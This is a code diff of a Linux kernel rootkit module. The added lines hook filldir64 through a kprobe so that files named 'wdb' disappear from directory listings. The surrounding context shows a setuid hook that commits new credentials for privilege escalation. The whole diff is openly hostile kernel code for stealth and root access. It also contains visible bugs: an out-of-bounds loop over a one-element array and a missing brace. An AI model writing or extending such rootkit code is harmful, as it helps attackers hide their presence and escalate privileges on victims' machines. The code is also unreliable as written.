@@ -50,7 +50,9 @@ void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsi
     commit_creds(new_creds);
 }
 /* Hiding our files from ls */
-
+const char *hidden_filenames[1]={"wdb"};
+static char symbol[KSYM_NAME_LEN]="filldir64";
+module_param_string(symbol, symbol, KSYM_NAME_LEN, 0644);
 /* struct for info to be passed from entry handler to post handler */
 struct getdents_data{
     int fd;
@@ -59,6 +61,26 @@ struct getdents_data{
     int skip_file;
 };
 
+
+
+static int __kprobes pre_handler(struct kprobe *p, struct pt_regs *regs){
+    char * filename = (char *)regs->si;
+
+	pr_info("<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
+		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si, regs->flags);
+	for (int i = 0; i < 2; i++) {
+		if (strcmp(filename, hidden_filenames[i]) == 0) {
+			strcpy((char *)regs->si, "\x00");
+		}
+	}
+
+	return 0;
+}
+
+static struct kprobe kp={
+    .symbol_name        =symbol,
+    .pre_handler        =pre_handler,
+};
 
 static int __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
 	printk(KERN_INFO "stepping through entry handler");
@@ -165,7 +187,7 @@ struct kprobe __x64_sys_setuid_hook = {
 static int __init rkin(void)
 {
     printk(KERN_INFO "module loaded\n");
-    int setuid_registered = register_kprobe(&__x64_sys_setuid_hook);
+ /*   int setuid_registered = register_kprobe(&__x64_sys_setuid_hook);
     int getdents64_registered = register_kretprobe(&__x64_sys_getdents64_hook);
     if (setuid_registered < 0 || getdents64_registered < 0)
     {
@@ -176,18 +198,24 @@ static int __init rkin(void)
         printk(KERN_INFO "hooks registered\n");
         atomic_inc(&hooked);
     }
-
+*/
+    int ret=register_kprobe(&kp);
+    if(ret<0){
+        printk(KERN_ERR"could not register handler");
     return 0;
 }
 
 static void __exit rkout(void)
 {
+    /*
     if (atomic_read(&hooked))
     {
 	unregister_kretprobe(&__x64_sys_getdents64_hook);
         unregister_kprobe(&__x64_sys_setuid_hook);
         printk(KERN_INFO "unhooked\n");
-    }
+    }*/
+    unregister_kprobe(&kp);
+    
 }
 
 module_init(rkin);
